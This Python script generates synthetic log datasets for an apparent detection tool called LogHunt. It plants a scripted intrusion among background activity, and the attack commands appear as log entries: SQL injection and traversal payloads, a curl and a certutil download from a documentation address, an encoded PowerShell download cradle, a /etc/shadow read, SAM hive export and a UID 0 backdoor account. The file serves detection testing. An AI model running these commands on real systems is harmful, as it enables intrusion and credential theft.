"""Generate the reproducible datasets LogHunt is demonstrated on.

Two datasets are produced from the same generator, with the same seed:

    data/normal/   background activity only - used to check the false
                   positive rate of every rule
    data/attacks/  the same background activity with one intrusion woven
                   through it, across all three log sources

Because the attack is scripted, every alert LogHunt raises can be checked
against ground truth instead of guessed at. ``data/attacks/GROUND_TRUTH.md``
is written alongside the logs and lists what was planted.

Attacker addresses come from the documentation ranges reserved by RFC 5737
(203.0.113.0/24, 198.51.100.0/24) so the samples never point at real hosts.

Usage:
    python tools/generate_scenario.py
    python tools/generate_scenario.py --out data --seed 1337
"""
from __future__ import annotations

import argparse
import os
import random
from datetime import date, datetime, timedelta

# --- environment ------------------------------------------------------------
LINUX_HOST = "web-01"
WINDOWS_HOST = "DC01.corp.local"
INTERNAL_PREFIX = "192.168.1."

USERS = ["alice", "bob", "carol", "dave", "admin"]
WINDOWS_USERS = ["alice", "bob", "carol", "administrator"]
SERVICE_ACCOUNTS = ["svc_web", "svc_report"]

NORMAL_PATHS = [
    "/", "/index.html", "/login", "/dashboard", "/api/v1/orders", "/api/v1/products",
    "/static/css/main.css", "/static/js/app.js", "/static/img/logo.png", "/favicon.ico",
    "/search?q=laptop", "/search?q=monitor", "/products/1042", "/products/2381",
    "/cart", "/checkout", "/account/profile", "/api/v1/health", "/robots.txt",
]
NORMAL_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/128.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like "
    "Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "python-requests/2.32.3",
]

# --- attacker ---------------------------------------------------------------
ATTACKER_IP = "203.0.113.77"
SPRAY_IP = "198.51.100.23"
SCAN_PATHS = [
    "/admin", "/administrator", "/wp-admin", "/wp-login.php", "/phpmyadmin",
    "/.env", "/.git/config", "/backup.zip", "/config.php", "/server-status",
    "/cgi-bin/test.cgi", "/api/v1/debug", "/adminer.php", "/manager/html",
    "/solr/admin", "/jenkins", "/actuator/env", "/.aws/credentials", "/old/",
    "/test.php", "/shell.php", "/db.sql", "/backup.sql", "/web.config",
    "/console", "/setup.php", "/install.php", "/vendor/phpunit/phpunit/phpunit.xml",
    "/.svn/entries", "/sitemap.xml.gz", "/license.txt", "/readme.html",
    "/wp-content/debug.log", "/.DS_Store", "/composer.json", "/package-lock.json",
    "/api/v2/users", "/graphql", "/swagger.json", "/metrics", "/server-info",
]
SQLI_PAYLOADS = [
    "/search?q=laptop%27%20UNION%20SELECT%20username,password%20FROM%20users--",
    "/search?q=1%27%20OR%20%271%27=%271",
    "/products/1042%20UNION%20ALL%20SELECT%20NULL,version()--",
    "/api/v1/orders?id=1%20AND%20SLEEP(5)--",
    "/search?q=x%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--",
]
TRAVERSAL_PAYLOADS = [
    "/download?file=../../../../etc/passwd",
    "/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/view?page=/etc/shadow",
]


def _rand_internal(rng: random.Random) -> str:
    return INTERNAL_PREFIX + str(rng.choice([10, 11, 12, 15, 20, 21, 22, 30, 31, 45, 50]))


# --- line builders ----------------------------------------------------------
def syslog(ts: datetime, process: str, pid: int | None, message: str,
           host: str = LINUX_HOST) -> str:
    tag = f"{process}[{pid}]" if pid else process
    return f"{ts:%b %e %H:%M:%S} {host} {tag}: {message}".replace("  ", " ", 0)


def access(ts: datetime, ip: str, path: str, status: int, size: int,
           agent: str, method: str = "GET", user: str = "-") -> str:
    return (f'{ip} - {user} [{ts:%d/%b/%Y:%H:%M:%S} +0800] "{method} {path} HTTP/1.1" '
            f'{status} {size} "-" "{agent}"')


def win_event(ts: datetime, event_id: int, task: str, description: str,
              fields: list[tuple[str, str]], computer: str = WINDOWS_HOST) -> str:
    lines = [
        "Log Name:      Security",
        "Source:        Microsoft-Windows-Security-Auditing",
        f"Date:          {ts.month}/{ts.day}/{ts.year} "
        f"{ts.strftime('%I:%M:%S %p').lstrip('0')}",
        f"Event ID:      {event_id}",
        f"Task Category: {task}",
        "Level:         Information",
        "Keywords:      Audit Success" if event_id != 4625 else "Keywords:      Audit Failure",
        f"Computer:      {computer}",
        "Description:",
        description,
        "",
    ]
    for key, value in fields:
        lines.append(f"\t{key}:\t{value}")
    return "\n".join(lines) + "\n"


def logon_event(ts: datetime, event_id: int, user: str, ip: str, logon_type: int,
                computer: str = WINDOWS_HOST, workstation: str = "WS-CORP") -> str:
    failed = event_id == 4625
    description = ("An account failed to log on." if failed
                   else "An account was successfully logged on.")
    fields = [
        ("Security ID", "NULL SID" if failed else "CORP\\" + user),
        ("Account Name", "-" if failed else user),
    ]
    if failed:
        fields += [
            ("Account For Which Logon Failed", ""),
            ("Account Name", user),
            ("Account Domain", "CORP"),
            ("Failure Reason", "Unknown user name or bad password."),
            ("Status", "0xC000006D"),
            ("Sub Status", "0xC000006A"),
        ]
    else:
        fields += [("Account Domain", "CORP"),
                   ("Logon ID", f"0x{random.getrandbits(24):X}")]
    fields += [
        ("Logon Type", str(logon_type)),
        ("Workstation Name", workstation),
        ("Source Network Address", ip),
        ("Source Port", str(random.randint(30000, 60000))),
        ("Logon Process", "NtLmSsp" if logon_type == 3 else "User32"),
        ("Authentication Package", "NTLM"),
    ]
    return win_event(ts, event_id, "Logon", description, fields, computer)


def process_event(ts: datetime, user: str, image: str, command: str,
                  parent: str = "C:\\Windows\\System32\\cmd.exe",
                  computer: str = WINDOWS_HOST) -> str:
    return win_event(
        ts, 4688, "Process Creation", "A new process has been created.",
        [
            ("Security ID", "CORP\\" + user),
            ("Account Name", user),
            ("Account Domain", "CORP"),
            ("New Process ID", f"0x{random.getrandbits(16):X}"),
            ("New Process Name", image),
            ("Token Elevation Type", "%%1936"),
            ("Creator Process Name", parent),
            ("Process Command Line", command),
        ],
        computer,
    )


def privilege_event(ts: datetime, user: str, computer: str = WINDOWS_HOST) -> str:
    return win_event(
        ts, 4672, "Special Logon", "Special privileges assigned to new logon.",
        [
            ("Security ID", "CORP\\" + user),
            ("Account Name", user),
            ("Account Domain", "CORP"),
            ("Privileges", "SeSecurityPrivilege\n\t\t\tSeBackupPrivilege\n\t\t\t"
                           "SeTakeOwnershipPrivilege\n\t\t\tSeDebugPrivilege"),
        ],
        computer,
    )


# --- background activity ----------------------------------------------------
def background(rng: random.Random, day: date) -> tuple[list, list, list]:
    """A working day of ordinary activity on all three log sources."""
    auth: list[tuple[datetime, str]] = []
    web: list[tuple[datetime, str]] = []
    windows: list[tuple[datetime, str]] = []

    start = datetime.combine(day, datetime.min.time()).replace(hour=7)

    # Linux: people logging in and out, plus routine cron and sudo.
    for _ in range(120):
        ts = start + timedelta(minutes=rng.randint(0, 780), seconds=rng.randint(0, 59))
        user = rng.choice(USERS)
        ip = _rand_internal(rng)
        pid = rng.randint(1000, 9999)
        auth.append((ts, syslog(ts, "sshd", pid,
                                f"Accepted password for {user} from {ip} port "
                                f"{rng.randint(40000, 65000)} ssh2")))
        auth.append((ts + timedelta(seconds=1),
                     syslog(ts + timedelta(seconds=1), "sshd", pid,
                            f"pam_unix(sshd:session): session opened for user {user} "
                            f"by (uid=0)")))
        out = ts + timedelta(minutes=rng.randint(3, 120))
        auth.append((out, syslog(out, "sshd", pid,
                                 f"pam_unix(sshd:session): session closed for user {user}")))

    # A sprinkling of genuine mistyped passwords - never enough to look like
    # a brute force, which is what keeps the false-positive count honest.
    for _ in range(40):
        ts = start + timedelta(minutes=rng.randint(0, 780), seconds=rng.randint(0, 59))
        user = rng.choice(USERS)
        auth.append((ts, syslog(ts, "sshd", rng.randint(1000, 9999),
                                f"Failed password for {user} from {_rand_internal(rng)} "
                                f"port {rng.randint(40000, 65000)} ssh2")))

    # Routine administration: alice uses sudo for her job.
    for _ in range(25):
        ts = start + timedelta(minutes=rng.randint(30, 780), seconds=rng.randint(0, 59))
        command = rng.choice([
            "/usr/bin/systemctl restart nginx", "/usr/bin/apt-get update",
            "/usr/bin/tail -n 100 /var/log/nginx/error.log",
            "/usr/bin/docker ps", "/usr/bin/df -h",
        ])
        auth.append((ts, syslog(ts, "sudo", None,
                                f"   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; "
                                f"COMMAND={command}")))
    for _ in range(60):
        ts = start + timedelta(minutes=rng.randint(0, 780))
        auth.append((ts, syslog(ts, "CRON", rng.randint(1000, 9999),
                                "pam_unix(cron:session): session opened for user root "
                                "by (uid=0)")))

    # Web: the bulk of the volume, as in any real environment.
    for _ in range(9000):
        ts = start + timedelta(seconds=rng.randint(0, 46800))
        path = rng.choice(NORMAL_PATHS)
        status = rng.choices([200, 200, 200, 200, 304, 302, 404, 500],
                             weights=[60, 15, 10, 5, 4, 3, 2, 1])[0]
        web.append((ts, access(ts, _rand_internal(rng) if rng.random() < 0.35
                               else f"198.51.100.{rng.randint(100, 250)}",
                               path, status, rng.randint(180, 48000),
                               rng.choice(NORMAL_AGENTS))))

    # Windows: interactive and network logons from the corporate network.
    for _ in range(90):
        ts = start + timedelta(minutes=rng.randint(0, 780), seconds=rng.randint(0, 59))
        user = rng.choice(WINDOWS_USERS)
        windows.append((ts, logon_event(ts, 4624, user, _rand_internal(rng),
                                        rng.choice([2, 3, 3]))))
    for _ in range(30):
        ts = start + timedelta(minutes=rng.randint(0, 780), seconds=rng.randint(0, 59))
        windows.append((ts, logon_event(ts, 4625, rng.choice(WINDOWS_USERS),
                                        _rand_internal(rng), 3)))
    for _ in range(40):
        ts = start + timedelta(minutes=rng.randint(0, 780), seconds=rng.randint(0, 59))
        user = rng.choice(WINDOWS_USERS)
        image, command = rng.choice([
            ("C:\\Program Files\\Git\\bin\\git.exe", "git.exe pull"),
            ("C:\\Windows\\System32\\taskhostw.exe", "taskhostw.exe"),
            ("C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
             "EXCEL.EXE /dde"),
            ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c dir Z:\\reports"),
        ])
        windows.append((ts, process_event(ts, user, image, command)))
    for account in SERVICE_ACCOUNTS:
        for _ in range(12):
            ts = start + timedelta(minutes=rng.randint(0, 780))
            windows.append((ts, logon_event(ts, 4624, account, _rand_internal(rng), 5)))

    return auth, web, windows


# --- the intrusion ----------------------------------------------------------
def attack(rng: random.Random, day: date) -> tuple[list, list, list, list[str]]:
    """One scripted intrusion, and the ground truth describing it."""
    auth: list[tuple[datetime, str]] = []
    web: list[tuple[datetime, str]] = []
    windows: list[tuple[datetime, str]] = []
    truth: list[str] = []

    base = datetime.combine(day, datetime.min.time())
    scan_agent = "gobuster/3.6"
    sqlmap_agent = "sqlmap/1.8.4#stable (https://sqlmap.org)"

    # Stage 1 - content discovery scan (10:14:00 onwards)
    t = base.replace(hour=10, minute=14)
    for i, path in enumerate(SCAN_PATHS):
        ts = t + timedelta(seconds=i * 3)
        status = 404 if path not in ("/admin", "/login") else 200
        web.append((ts, access(ts, ATTACKER_IP, path, status,
                               0 if status == 404 else 1043, scan_agent)))
    truth.append(f"10:14:00 Stage 1 Reconnaissance - {len(SCAN_PATHS)} path probes from "
                 f"{ATTACKER_IP} (gobuster UA), mostly HTTP 404 -> expect LH-009")

    # Stage 2 - exploitation attempts against the application (10:18)
    t = base.replace(hour=10, minute=18)
    for i, payload in enumerate(SQLI_PAYLOADS):
        ts = t + timedelta(seconds=i * 7)
        web.append((ts, access(ts, ATTACKER_IP, payload, 200 if i < 2 else 500,
                               2100, sqlmap_agent)))
    for i, payload in enumerate(TRAVERSAL_PAYLOADS):
        ts = t + timedelta(seconds=40 + i * 9)
        web.append((ts, access(ts, ATTACKER_IP, payload, 200 if i == 1 else 403,
                               1800, sqlmap_agent)))
    truth.append(f"10:18:00 Stage 2 Exploitation - {len(SQLI_PAYLOADS)} SQL injection and "
                 f"{len(TRAVERSAL_PAYLOADS)} traversal/LFI attempts from {ATTACKER_IP}, "
                 f"some answered 200 -> expect LH-008 (SQL Injection, Path Traversal, LFI)")

    # Stage 3 - SSH brute force against admin (10:21:01 - 10:21:23)
    t = base.replace(hour=10, minute=21, second=1)
    attempts = 17
    for i in range(attempts):
        ts = t + timedelta(seconds=int(i * 1.3))
        auth.append((ts, syslog(ts, "sshd", 20000 + i,
                                f"Failed password for admin from {ATTACKER_IP} port "
                                f"{51000 + i} ssh2")))
    truth.append(f"10:21:01 Stage 3 Credential Attack - {attempts} failed SSH passwords for "
                 f"'admin' from {ATTACKER_IP} in 22s -> expect LH-001")

    # Stage 4 - the guess lands (10:21:24)
    ts = base.replace(hour=10, minute=21, second=24)
    auth.append((ts, syslog(ts, "sshd", 20100,
                            f"Accepted password for admin from {ATTACKER_IP} port 51100 ssh2")))
    auth.append((ts + timedelta(seconds=1),
                 syslog(ts + timedelta(seconds=1), "sshd", 20100,
                        "pam_unix(sshd:session): session opened for user admin by (uid=0)")))
    truth.append("10:21:24 Stage 4 Successful Access - SSH password accepted for 'admin' "
                 "from the same address 1s after the last failure -> expect LH-003 "
                 "(critical) and LH-004 (source outside admin's baseline)")

    # Stage 5 - privileged actions inside the session (10:23 - 10:24)
    privileged = [
        (base.replace(hour=10, minute=23, second=1),
         "/usr/bin/cat /etc/shadow"),
        (base.replace(hour=10, minute=23, second=18),
         "/usr/bin/curl -o /tmp/.x http://203.0.113.77:8080/x.sh"),
        (base.replace(hour=10, minute=23, second=44),
         "/bin/chmod 777 /tmp/.x"),
        (base.replace(hour=10, minute=24, second=9),
         "/usr/sbin/useradd -o -u 0 -g 0 -m svc_backup"),
        (base.replace(hour=10, minute=24, second=31),
         "/usr/bin/history -c"),
    ]
    for ts, command in privileged:
        auth.append((ts, syslog(ts, "sudo", None,
                                f"   admin : TTY=pts/1 ; PWD=/root ; USER=root ; "
                                f"COMMAND={command}")))
    ts = base.replace(hour=10, minute=24, second=10)
    auth.append((ts, syslog(ts, "useradd", 20250,
                            "new user: name=svc_backup, UID=0, GID=0, home=/home/svc_backup, "
                            "shell=/bin/bash")))
    truth.append("10:23:01 Stage 5 Privilege Escalation - 5 sudo commands as root: reads "
                 "/etc/shadow, downloads a payload, chmod 777, creates a UID 0 account "
                 "'svc_backup', clears shell history -> expect LH-005, LH-006, LH-011")

    # Stage 6 - the same actor moves to the Windows domain controller (10:25)
    t = base.replace(hour=10, minute=25)
    for i in range(12):
        ts = t + timedelta(seconds=i * 4)
        windows.append((ts, logon_event(ts, 4625, "administrator", ATTACKER_IP, 3,
                                        workstation="KALI")))
    ts = base.replace(hour=10, minute=26, second=10)
    windows.append((ts, logon_event(ts, 4624, "administrator", ATTACKER_IP, 10,
                                    workstation="KALI")))
    windows.append((base.replace(hour=10, minute=26, second=12),
                    privilege_event(base.replace(hour=10, minute=26, second=12),
                                    "administrator")))
    truth.append(f"10:25:00 Stage 6 Lateral Credential Attack - 12 x event 4625 for "
                 f"'administrator' from {ATTACKER_IP} on {WINDOWS_HOST}, then 4624 "
                 f"(logon type 10, RDP) at 10:26:10 and 4672 special privileges -> expect "
                 f"LH-001, LH-003, LH-005")

    # Stage 7 - post-access execution on the domain controller
    executions = [
        (base.replace(hour=10, minute=27, second=3),
         "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -nop -w hidden -ep bypass -enc "
         "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0A"
         "CkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALg"
         "AwAC4AMQAxADMALgA3ADcALwBhAC4AcABzADEAJwApAA=="),
        (base.replace(hour=10, minute=27, second=41),
         "C:\\Windows\\System32\\whoami.exe", "whoami.exe /all"),
        (base.replace(hour=10, minute=28, second=8),
         "C:\\Windows\\System32\\net.exe", "net.exe group \"Domain Admins\" /domain"),
        (base.replace(hour=10, minute=29, second=22),
         "C:\\Windows\\System32\\certutil.exe",
         "certutil.exe -urlcache -split -f http://203.0.113.77:8080/t.exe C:\\Users\\Public\\t.exe"),
        (base.replace(hour=10, minute=30, second=5),
         "C:\\Windows\\System32\\reg.exe",
         "reg.exe save HKLM\\SAM C:\\Users\\Public\\sam.hiv"),
    ]
    for ts, image, command in executions:
        windows.append((ts, process_event(ts, "administrator", image, command)))
    truth.append("10:27:03 Stage 7 Execution - encoded PowerShell download cradle, host and "
                 "domain discovery, certutil file transfer, SAM hive export -> expect LH-010 "
                 "(powershell.exe, certutil.exe, reg.exe, net.exe, whoami.exe)")

    # Stage 8 - persistence and cleanup
    ts = base.replace(hour=10, minute=31, second=17)
    windows.append((ts, win_event(
        ts, 4720, "User Account Management", "A user account was created.",
        [("Security ID", "CORP\\administrator"), ("Account Name", "administrator"),
         ("Account Domain", "CORP"), ("New Account Name", "svc_helpdesk"),
         ("New Account Domain", "CORP"), ("SAM Account Name", "svc_helpdesk")])))
    ts = base.replace(hour=10, minute=31, second=52)
    windows.append((ts, win_event(
        ts, 4732, "Security Group Management",
        "A member was added to a security-enabled local group.",
        [("Security ID", "CORP\\administrator"), ("Account Name", "administrator"),
         ("Group Name", "Administrators"), ("Group Domain", "Builtin"),
         ("Member Name", "CORP\\svc_helpdesk")])))
    ts = base.replace(hour=10, minute=33, second=40)
    windows.append((ts, win_event(
        ts, 1102, "Log clear", "The audit log was cleared.",
        [("Security ID", "CORP\\administrator"), ("Account Name", "administrator"),
         ("Domain Name", "CORP"), ("Logon ID", "0x3E7")])))
    truth.append("10:31:17 Stage 8 Persistence and Defense Evasion - local account "
                 "'svc_helpdesk' created (4720), added to Administrators (4732), security "
                 "audit log cleared (1102) -> expect LH-006")

    # A second, unrelated actor: password spraying from another address. This
    # exists to prove incidents stay separate instead of collapsing into one.
    t = base.replace(hour=14, minute=2)
    spray_users = ["alice", "bob", "carol", "dave", "eve", "frank", "grace"]
    for i, user in enumerate(spray_users * 2):
        ts = t + timedelta(seconds=i * 11)
        auth.append((ts, syslog(ts, "sshd", 30000 + i,
                                f"Failed password for {'invalid user ' if user in ('eve', 'frank', 'grace') else ''}"
                                f"{user} from {SPRAY_IP} port {52000 + i} ssh2")))
    truth.append(f"14:02:00 Unrelated actor - {len(spray_users) * 2} failures across "
                 f"{len(spray_users)} accounts from {SPRAY_IP} (one password, many users) "
                 f"-> expect LH-002, as a separate incident from the {ATTACKER_IP} chain")

    return auth, web, windows, truth


# --- writing ----------------------------------------------------------------
def _write_log(path: str, entries: list[tuple[datetime, str]], joiner: str = "\n") -> int:
    entries = sorted(entries, key=lambda item: item[0])
    with open(path, "w", encoding="utf-8", newline="\n") as handle:
        handle.write(joiner.join(text for _, text in entries))
        handle.write("\n")
    return len(entries)


def generate(out_dir: str, seed: int = 1337, day: date = date(2026, 9, 18),
             with_attack: bool = True) -> dict[str, int]:
    rng = random.Random(seed)
    random.seed(seed)          # the win_event helpers use the module RNG
    os.makedirs(out_dir, exist_ok=True)

    auth, web, windows = background(rng, day)
    truth: list[str] = []
    if with_attack:
        a_auth, a_web, a_windows, truth = attack(rng, day)
        auth += a_auth
        web += a_web
        windows += a_windows

    counts = {
        "auth.log": _write_log(os.path.join(out_dir, "auth.log"), auth),
        "access.log": _write_log(os.path.join(out_dir, "access.log"), web),
        "security.log": _write_log(os.path.join(out_dir, "security.log"), windows,
                                   joiner="\n"),
    }

    if with_attack and truth:
        with open(os.path.join(out_dir, "GROUND_TRUTH.md"), "w", encoding="utf-8",
                  newline="\n") as handle:
            handle.write("# Planted attack scenario\n\n")
            handle.write(f"Generated by `tools/generate_scenario.py` with seed {seed} for "
                         f"{day:%Y-%m-%d}. Re-running the generator reproduces these logs "
                         f"byte for byte.\n\n")
            handle.write(f"Attacker: `{ATTACKER_IP}` (RFC 5737 documentation range). "
                         f"Second actor: `{SPRAY_IP}`.\n\n")
            handle.write("| # | Planted activity |\n|---|---|\n")
            for i, line in enumerate(truth, start=1):
                handle.write(f"| {i} | {line} |\n")
            handle.write("\n## Event counts\n\n")
            for name, count in counts.items():
                handle.write(f"- `{name}`: {count} records\n")
        counts["GROUND_TRUTH.md"] = len(truth)
    return counts


def main() -> None:
    ap = argparse.ArgumentParser(description="Generate LogHunt sample datasets")
    ap.add_argument("--out", default="data", help="output directory (default: data)")
    ap.add_argument("--seed", type=int, default=1337)
    ap.add_argument("--date", default="2026-09-18", help="day to generate, YYYY-MM-DD")
    args = ap.parse_args()

    day = datetime.strptime(args.date, "%Y-%m-%d").date()
    normal = generate(os.path.join(args.out, "normal"), args.seed, day, with_attack=False)
    attacks = generate(os.path.join(args.out, "attacks"), args.seed, day, with_attack=True)

    print("data/normal :", ", ".join(f"{k}={v}" for k, v in normal.items()))
    print("data/attacks:", ", ".join(f"{k}={v}" for k, v in attacks.items()))


if __name__ == "__main__":
    main()
